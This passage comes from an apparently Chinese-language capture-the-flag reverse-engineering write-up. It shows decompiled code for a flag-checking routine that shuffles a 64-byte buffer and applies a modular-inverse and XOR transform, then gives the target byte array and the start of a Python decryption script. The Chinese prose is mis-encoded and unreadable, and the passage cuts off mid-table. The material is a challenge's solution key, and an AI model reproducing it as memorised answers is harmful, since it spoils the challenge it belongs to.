punctuation\">;</span></pre></td></tr><tr><td data-num=\"136\"></td><td><pre>      v48 <span class=\"token operator\">=</span> flagg<span class=\"token punctuation\">[</span>v45 <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"137\"></td><td><pre>      flagg<span class=\"token punctuation\">[</span>v45 <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> flagg<span class=\"token punctuation\">[</span>v47<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"138\"></td><td><pre>      flagg<span class=\"token punctuation\">[</span>v47<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> v48<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"139\"></td><td><pre>      v49 <span class=\"token operator\">=</span> <span class=\"token operator\">*</span>v46<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"140\"></td><td><pre>      <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">unsigned</span> __int64<span class=\"token punctuation\">)</span><span class=\"token operator\">*</span>v46 <span class=\"token operator\">></span> <span class=\"token number\">0x3F</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"141\"></td><td><pre>        <span class=\"token keyword\">goto</span> LABEL_53<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"142\"></td><td><pre>      v50 <span class=\"token operator\">=</span> flagg<span class=\"token punctuation\">[</span>v45 <span class=\"token operator\">-</span> <span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"143\"></td><td><pre>      flagg<span class=\"token punctuation\">[</span>v45 <span class=\"token operator\">-</span> <span class=\"token number\">2</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> flagg<span class=\"token punctuation\">[</span>v49<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"144\"></td><td><pre>      flagg<span class=\"token punctuation\">[</span>v49<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> v50<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"145\"></td><td><pre>      v46 <span class=\"token operator\">+=</span> <span class=\"token number\">2</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"146\"></td><td><pre>      v45 <span class=\"token operator\">-=</span> <span class=\"token number\">2LL</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"147\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"148\"></td><td><pre>    <span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span> v45 <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"149\"></td><td><pre>    <span class=\"token function\">memcpy</span><span class=\"token punctuation\">(</span>dest<span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>unk_55C3745EA920<span class=\"token punctuation\">,</span> <span class=\"token number\">0x200uLL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"150\"></td><td><pre>    v52 <span class=\"token operator\">=</span> <span class=\"token number\">64LL</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"151\"></td><td><pre>    v53 <span class=\"token operator\">=</span> <span class=\"token operator\">&amp;</span>dest<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"152\"></td><td><pre>    <span class=\"token keyword\">do</span></pre></td></tr><tr><td data-num=\"153\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"154\"></td><td><pre>      v54 <span class=\"token operator\">=</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>v53 <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"155\"></td><td><pre>      <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> v54 <span class=\"token operator\">></span> <span class=\"token number\">0x3F</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"156\"></td><td><pre>        <span class=\"token keyword\">goto</span> LABEL_53<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"157\"></td><td><pre>      v55 <span class=\"token operator\">=</span> flagg<span class=\"token punctuation\">[</span>v52 <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"158\"></td><td><pre>      flagg<span class=\"token punctuation\">[</span>v52 <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> flagg<span class=\"token punctuation\">[</span>v54<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"159\"></td><td><pre>      flagg<span class=\"token punctuation\">[</span>v54<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> v55<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"160\"></td><td><pre>      v56 <span class=\"token operator\">=</span> <span class=\"token operator\">*</span>v53<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"161\"></td><td><pre>      <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">unsigned</span> __int64<span class=\"token punctuation\">)</span><span class=\"token operator\">*</span>v53 <span class=\"token operator\">></span> <span class=\"token number\">0x3F</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"162\"></td><td><pre>        <span class=\"token keyword\">goto</span> LABEL_53<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"163\"></td><td><pre>      v57 <span class=\"token operator\">=</span> flagg<span class=\"token punctuation\">[</span>v52 <span class=\"token operator\">-</span> <span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"164\"></td><td><pre>      flagg<span class=\"token punctuation\">[</span>v52 <span class=\"token operator\">-</span> <span class=\"token number\">2</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> flagg<span class=\"token punctuation\">[</span>v56<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"165\"></td><td><pre>      flagg<span class=\"token punctuation\">[</span>v56<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> v57<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"166\"></td><td><pre>      v53 <span class=\"token operator\">+=</span> <span class=\"token number\">2</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"167\"></td><td><pre>      v52 <span class=\"token operator\">-=</span> <span class=\"token number\">2LL</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"168\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"169\"></td><td><pre>    <span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span> v52 <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"170\"></td><td><pre>    v58 <span class=\"token operator\">=</span> <span class=\"token number\">0LL</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"171\"></td><td><pre>    <span class=\"token keyword\">do</span></pre></td></tr><tr><td data-num=\"172\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"173\"></td><td><pre>      v59 <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">unsigned</span> __int8<span class=\"token punctuation\">)</span>flagg<span class=\"token punctuation\">[</span>v58<span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"174\"></td><td><pre>      <span class=\"token function\">LOWORD</span><span class=\"token punctuation\">(</span>v51<span class=\"token punctuation\">)</span> <span class=\"token operator\">=</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"175\"></td><td><pre>      <span class=\"token function\">LOWORD</span><span class=\"token punctuation\">(</span>v52<span class=\"token punctuation\">)</span> <span class=\"token operator\">=</span> <span class=\"token number\">257</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"176\"></td><td><pre>      v60 <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"177\"></td><td><pre>      <span class=\"token keyword\">do</span></pre></td></tr><tr><td data-num=\"178\"></td><td><pre>      <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"179\"></td><td><pre>        v62 <span class=\"token operator\">=</span> v52<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"180\"></td><td><pre>        <span class=\"token function\">LOWORD</span><span class=\"token punctuation\">(</span>v52<span class=\"token punctuation\">)</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">unsigned</span> __int16<span class=\"token punctuation\">)</span>v52 <span class=\"token operator\">/</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">unsigned</span> __int16<span class=\"token punctuation\">)</span>v59<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"181\"></td><td><pre>        v61 <span class=\"token operator\">=</span> v62 <span class=\"token operator\">%</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">unsigned</span> __int16<span class=\"token punctuation\">)</span>v59<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"182\"></td><td><pre>        v63 <span class=\"token operator\">=</span> v51<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"183\"></td><td><pre>        v51 <span class=\"token operator\">=</span> v60 <span class=\"token operator\">-</span> v51 <span class=\"token operator\">*</span> v52<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"184\"></td><td><pre>        <span class=\"token function\">LODWORD</span><span class=\"token punctuation\">(</span>v52<span class=\"token punctuation\">)</span> <span class=\"token operator\">=</span> v59<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"185\"></td><td><pre>        v59 <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">unsigned</span> __int16<span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>v62 <span class=\"token operator\">%</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">unsigned</span> __int16<span class=\"token punctuation\">)</span>v59<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"186\"></td><td><pre>        v60 <span class=\"token operator\">=</span> v63<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"187\"></td><td><pre>      <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"188\"></td><td><pre>      <span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span> v61 <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"189\"></td><td><pre>      v64 <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"190\"></td><td><pre>      <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> <span class=\"token punctuation\">(</span>__int16<span class=\"token punctuation\">)</span>v63 <span class=\"token operator\">></span> <span class=\"token number\">0</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"191\"></td><td><pre>        v64 <span class=\"token operator\">=</span> v63<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"192\"></td><td><pre>      flagg<span class=\"token punctuation\">[</span>v58<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">unsigned</span> __int16<span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>v64 <span class=\"token operator\">+</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>__int16<span class=\"token punctuation\">)</span>v63 <span class=\"token operator\">>></span> <span class=\"token number\">15</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">-</span> v63<span class=\"token punctuation\">)</span> <span class=\"token operator\">/</span> <span class=\"token number\">0x101u</span></pre></td></tr><tr><td data-num=\"193\"></td><td><pre>                  <span class=\"token operator\">+</span> v63</pre></td></tr><tr><td data-num=\"194\"></td><td><pre>                  <span class=\"token operator\">+</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">unsigned</span> __int16<span class=\"token punctuation\">)</span>v63 <span class=\"token operator\">>></span> <span class=\"token number\">15</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"195\"></td><td><pre>                  <span class=\"token operator\">+</span> <span class=\"token number\">113</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">^</span> <span class=\"token number\">0x89</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"196\"></td><td><pre>      v52 <span class=\"token operator\">=</span> v58 <span class=\"token operator\">+</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"197\"></td><td><pre>      v58 <span class=\"token operator\">=</span> v52<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"198\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"199\"></td><td><pre>    <span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span> v52 <span class=\"token operator\">!=</span> <span class=\"token number\">64</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"200\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"201\"></td><td><pre>  <span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span> v8 <span class=\"token operator\">!=</span> <span class=\"token number\">256</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">// æå–å‡ºçš„æ€»çš„åŠ å¯†</span></pre></td></tr></table></figure><p><img data-src=\"/images/image-20230910153409350.png\" alt=\"image-20230910153409350\"></p>\n<p>ä¸å‡ºæ„å¤–çš„è¯ 64 ä½æ¯”è¾ƒæ•°æ®æ˜¯ cmp=[0xA7, 0x51, 0x68, 0x52, 0x85, 0x27, 0xFF, 0x31, 0x88, 0x87, 0xD2, 0xC7, 0xD3, 0x23, 0x3F, 0x52, 0x55, 0x10, 0x1F, 0xAF, 0x27, 0xF0, 0x94, 0x5C, 0xCD, 0x3F, 0x7A, 0x79, 0x9F, 0x2F, 0xF0, 0xE7, 0x45, 0xF0, 0x86, 0x3C, 0xF9, 0xB0, 0xEA, 0x6D, 0x90, 0x42, 0xF7, 0x91, 0xED, 0x3A, 0x9A, 0x7C, 0x01, 0x6B, 0x84, 0xDC, 0x6C, 0xC8, 0x43, 0x07, 0x5C, 0x08, 0xF7, 0xDF, 0xEB, 0xE3, 0xAE, 0xA4]    (ä¹Ÿå°±æ˜¯è¿™ 64 ä½çš„ 4 ä¸ª xmmword)</p>\n<p><strong>åŸé¡ºåº 0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ {}</strong></p>\n<p><strong>æ‰“ä¹±åçš„é¡ºåº HfVl {qPcCYNMoRi6D7Jr} espOL3FhwdWAtTGZba4Ugjvnx1QkKE2IS9yuz5BX08m</strong></p>\n<p>å­—ç¬¦çš„åŠ å¯†é€»è¾‘:</p>\n<pre><code>do\n    &#123;\n      v59 = (unsigned __int8)flagg[v58] + 1;\n      LOWORD(v51) = 1;\n      LOWORD(v52) = 257;\n      v60 = 0;\n      do\n      &#123;\n        v62 = v52;\n        LOWORD(v52) = (unsigned __int16)v52 / (unsigned __int16)v59;\n        v61 = v62 % (unsigned __int16)v59;\n        v63 = v51;\n        v51 = v60 - v51 * v52;\n        LODWORD(v52) = v59;\n        v59 = (unsigned __int16)(v62 % (unsigned __int16)v59);\n        v60 = v63;\n      &#125;\n      while ( v61 );\n      v64 = 0;\n      if ( (__int16)v63 &gt; 0 )\n        v64 = v63;\n      flagg[v58] = ((unsigned __int16)(v64 + ((__int16)v63 &gt;&gt; 15) - v63) / 0x101u\n                  + v63\n                  + ((unsigned __int16)v63 &gt;&gt; 15)\n                  + 113) ^ 0x89;\n      v52 = v58 + 1;\n      v58 = v52;\n    &#125;\n    while ( v52 != 64 );\n</code></pre>\n<p>ä¸€é˜¶æ®µè„šæœ¬</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">decrypt</span><span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">:</span> <span class=\"token builtin\">list</span><span class=\"token punctuation\">,</span> table<span class=\"token punctuation\">:</span> <span class=\"token builtin\">dict</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    tmp<span class=\"token operator\">=</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> data<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>        tmp<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span>table<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token keyword\">return</span> tmp</pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">reverse_order</span><span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">:</span><span class=\"token builtin\">list</span><span class=\"token punctuation\">,</span> table<span class=\"token punctuation\">:</span> <span class=\"token builtin\">list</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    tmp <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">64</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>        tmp<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">[</span>table<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token keyword\">return</span> tmp</pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token comment\">#get crypto table</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>s0_255 <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token number\">0xFB</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x7B</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x4E</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xBB</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x51</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x15</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x8D</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xDB</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xB0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xAC</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xA5</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x8E</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xAA</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xB2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x60</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xEB</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x63</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x5C</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xDE</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x42</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x2B</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xC6</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xA6</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x35</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x30</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x43</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xD6</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x5F</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xBD</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x24</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xB1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xE3</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x8C</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xA7</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xD5</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x2A</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x7C</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x6D</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x8B</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x17</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x9D</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x83</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xFE</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x69</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x10</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x59</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xA9</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x9E</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x0F</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x1C</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x66</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x97</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x5B</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x61</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xED</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xAD</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xE0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xDA</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x27</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x06</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x25</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xDC</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x5E</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xE7</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>        <span class=\"token number\">0x41</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x32</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xD2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xD9</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x8F</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xEE</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xAF</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x03</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x93</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x3A</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xA2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xE1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xB3</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xEC</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x81</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x9F</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xCA</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x58</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xB7</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x79</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xFD</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x3B</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xA0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x02</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x0C</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xCB</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xA8</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x80</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xC0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x16</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x4D</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x2F</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x75</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x71</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x0A</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x04</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x39</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xFF</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xC1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x9C</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xAB</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xEF</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xA4</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xD8</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xE2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x14</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xC2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x6C</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x64</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x1E</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x6B</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x7E</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x99</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x2E</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x09</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x0B</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x86</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x74</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x6A</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xC4</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x2D</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x4F</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xF9</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>        <span class=\"token number\">0xFA</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x94</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xB6</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x1F</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x89</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x6F</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x5D</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xE8</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xEA</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xB5</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x5A</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x65</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x88</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xC5</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x7F</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x77</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x11</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xCF</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xF1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x1B</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x3F</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xF4</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x48</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x47</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x12</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xE4</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xBA</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xDF</span><span class=\"token punctuation\">,</span> <span class=\"token 